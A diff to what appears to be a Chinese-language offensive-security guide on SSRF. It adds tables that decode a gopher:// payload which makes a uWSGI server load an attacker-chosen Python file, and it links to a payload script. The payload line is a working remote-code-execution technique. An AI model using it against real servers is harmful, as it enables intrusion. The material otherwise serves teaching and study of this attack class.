@@ -158,3 +158,16 @@ gopher://WSGI服务器地址:8000/_%00%1A%00%00%0A%00WSGI_FILE%0C%00/tmp/test.py
 脚本
 
 [WSGI](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/payloads/SSRF/WSGI.py)
+
+| 标头      |           |             |
+|-----------|-----------|-------------|
+| modifier1 | (1 byte)  | 0 (%00)     |
+| datasize  | (2 bytes) | 26 (%1A%00) |
+| modifier2 | (1 byte)  | 0 (%00)     |
+
+| 变量     (UWSGI_FILE) |           |    |            |   |
+|-----------------------|-----------|----|------------|---|
+| key length            | (2 bytes) | 10 | (%0A%00)   |   |
+| key data              | (m bytes) |    | UWSGI_FILE |   |
+| value length          | (2 bytes) | 12 | (%0C%00)   |   |
+| value data            | (n bytes) |    | /tmp/test.py   |   |
